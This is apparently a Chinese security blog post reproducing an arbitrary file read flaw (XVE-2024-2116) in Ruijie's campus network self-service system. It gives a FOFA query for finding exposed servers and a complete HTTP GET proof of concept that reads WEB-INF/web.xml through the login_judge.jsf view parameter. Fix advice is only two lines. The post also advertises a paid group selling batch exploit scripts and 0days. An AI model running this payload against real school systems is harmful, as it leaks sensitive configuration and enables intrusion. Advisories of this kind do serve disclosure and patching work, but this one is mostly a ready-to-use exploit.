#  「漏洞复现」锐捷校园网自助服务系统 login_judge.jsf 任意文件读取漏洞(XVE-2024-2116)   
冷漠安全  冷漠安全   2024-06-08 09:52  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
锐捷校园网自助服务系统是锐捷网络推出的一款面向学校和校园网络管理的解决方案。该系统旨在提供便捷的网络自助服务，使学生、教职员工和网络管理员能够更好地管理和利用校园网络资源。  
  
0x03  
  
**漏洞威胁**  
  
校园网自助服务系统/selfservice/selfservice/module/scgroup/web/login_judge.jsf 接口处存在任意文件读取漏洞，经过分析和研判，该漏洞利用难度低，可导致敏感信息泄漏，建议尽快修复。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
body="校园网自助服务系统"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0q6OXicPAvj9LnK1Kn2rSrgXibNrKsjic1ohdeZJDtZLjwEp1JiaW7GOVS8xr3UHg2j9e7ZwRokMdVpvg/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
POC  
```
GET /selfservice/selfservice/module/scgroup/web/login_judge.jsf?view=./WEB-INF/web.xml%3F HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0q6OXicPAvj9LnK1Kn2rSrgXDQKQOaXUX7b5jDhjmUT0nAhRo4IPX2ONv2hKOjicmXeyS8oib1ialbJNA/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0q6OXicPAvj9LnK1Kn2rSrgXm4bHRIic9pIQhUGSANVItVkrL4jhnjsnmUwHSb0BJTdjxlbpIuKErdw/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0q6OXicPAvj9LnK1Kn2rSrgX6tzFl1XmKdv2mtYXKF5icFJ1dQpxYHnMBPFNz0ox4yXiaxCP2oyWANzw/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0q6OXicPAvj9LnK1Kn2rSrgXB5wMq81vIns6ReMozmtotgx6qq6Xobia9jxWQ00nJ3S1YyEd8E4UXHQ/640?wx_fmt=gif&from=appmsg "")  
  
  
  
